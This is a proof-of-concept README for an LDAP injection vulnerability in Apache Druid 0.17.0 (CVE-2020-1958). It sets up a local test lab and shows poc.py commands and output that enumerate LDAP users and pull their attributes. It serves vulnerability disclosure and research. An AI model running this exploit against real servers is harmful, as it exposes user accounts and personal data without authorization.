# CVE-2020-1958 PoC

CVE-2020-1958 is high severity LDAP injection vulnerability in [Apache Druid](https://druid.apache.org/) 0.17.0. It allows an attacker to bypass LDAP search filter and to retrieve any LDAP attribute values of users that exist on the LDAP server.

From official Apache Druid [advisory](https://seclists.org/oss-sec/2020/q2/5):

> When LDAP authentication is enabled:
> - Callers of Druid APIs with a valid set of LDAP credentials can bypass the `credentialsValidator.userSearch` filter barrier that determines if a valid LDAP user is allowed to authenticate with Druid. They are still subject to role-based authorization checks, if configured.
> - Callers of Druid APIs can retrieve any LDAP attribute values of users that exist on the LDAP server, so long as that information is visible to the Druid server. This information disclosure does not require the caller itself to be a valid LDAP user.

## PoC

The [poc.py](poc.py) script demonstrates how an unauthorized attacker can enumerate users on LDAP server integrated with Druid and fetch the value of any attribute of any user.

### Local Druid test server

Skip this step if you already have a Druid server with enabled LDAP authentication.

1. Download Druid 0.17.0 and extract it

   ```shell
   $ wget https://archive.apache.org/dist/druid/0.17.0/apache-druid-0.17.0-bin.tar.gz
   $ tar -zxf apache-druid-0.17.0-bin.tar.gz
  
2. Enable and configure LDAP authentication in `conf/druid/single-server/nano-quickstart/_common/common.runtime.properties`

   * Enable `druid-basic-security` extension

     Locate `druid.extensions.loadList` and add `druid-basic-security`:

     ```properties
     druid.extensions.loadList=["druid-hdfs-storage", "druid-kafka-indexing-service", "druid-datasketches", "druid-basic-security"]
     ```
  
   * Configure LDAP authentication

     Add the following at the end of the file:

     ```properties
     druid.auth.authenticatorChain=["ldap"]

     druid.auth.authenticator.ldap.type=basic
     druid.auth.authenticator.ldap.initialAdminPassword=password
     druid.auth.authenticator.ldap.initialInternalClientPassword=password
     druid.auth.authenticator.ldap.credentialsValidator.type=ldap
     druid.auth.authenticator.ldap.credentialsValidator.url=ldap://127.0.0.1:2389
     druid.auth.authenticator.ldap.credentialsValidator.bindUser=cn=admin,dc=example,dc=org
     druid.auth.authenticator.ldap.credentialsValidator.bindPassword=admin
     druid.auth.authenticator.ldap.credentialsValidator.baseDn=dc=example,dc=org
     druid.auth.authenticator.ldap.credentialsValidator.userSearch=(&(uid=%s)(memberof=cn=users,dc=example,dc=org))
     druid.auth.authenticator.ldap.credentialsValidator.userAttribute=uid
     druid.auth.authenticator.ldap.authorizerName=MyAuthorizer

     druid.escalator.type=basic
     druid.escalator.internalClientUsername=user1
     druid.escalator.internalClientPassword=user1
     druid.escalator.authorizerName=MyAuthorizer

     druid.auth.authorizers=["MyAuthorizer"]
     druid.auth.authorizer.MyAuthorizer.type=basic
     druid.auth.authorizer.MyAuthorizer.initialAdminUser=user1
     druid.auth.authorizer.MyAuthorizer.initialAdminRole=admin
     druid.auth.authorizer.MyAuthorizer.roleProvider.type=ldap
     ```

3. Run OpenLDAP server

   ```shell
   $ docker run -p 2389:389 --name my-openldap-container osixia/openldap:1.3.0
   ```

4. Import users from [users.ldif](users.ldif) to LDAP

   ```shell
   $ ldapadd -x -D "cn=admin,dc=example,dc=org" -w admin -H ldap://localhost:2389 -f users.ldif
   ```

5. Run Druid server

   ```shell
   $ bin/start-nano-quickstart
   ```

### Enumerate users

[![asciicast](https://asciinema.org/a/enOT26z1Slsee3xEjBw1OL0Aw.svg)](https://asciinema.org/a/enOT26z1Slsee3xEjBw1OL0Aw)

```shell
$ ./poc.py --url http://127.0.0.1:8888/
[INFO] Enumerating users from http://127.0.0.1:8888/
admin1
admin2
admin3
admin4
admin5
admin6
admin7
user1
user2
user3
user4
```

### Retrieve LDAP attributes' values of `admin1` user

[![asciicast](https://asciinema.org/a/eY8vBXftW00dQaYnJOsGO0ZOZ.svg)](https://asciinema.org/a/eY8vBXftW00dQaYnJOsGO0ZOZ)

```shell
$ ./poc.py --url http://127.0.0.1:8888/ --user admin1 --attr mail
[INFO] Exfiltrating mail attribute of admin1 user from http://127.0.0.1:8888/
admin1@example.com
$ ./poc.py --url http://127.0.0.1:8888/ --user admin1 --attr givenName
[INFO] Exfiltrating givenName attribute of admin1 user from http://127.0.0.1:8888/
admin1
$ ./poc.py --url http://127.0.0.1:8888/ --user admin1 --attr sn
[INFO] Exfiltrating sn attribute of admin1 user from http://127.0.0.1:8888/
last
```
